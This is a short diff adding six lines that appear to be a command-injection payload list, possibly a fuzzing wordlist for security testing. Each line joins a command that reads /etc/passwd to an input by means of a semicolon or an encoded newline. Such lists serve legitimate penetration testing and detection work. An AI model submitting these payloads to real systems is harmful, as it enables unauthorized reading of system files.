@@ -1,0 +1,6 @@
+;cat /etc/passwd
+;head /etc/passwd
+;tail /etc/passwd
+%0acat /etc/passwd
+%0ahead /etc/passwd
+%0atail /etc/passwd
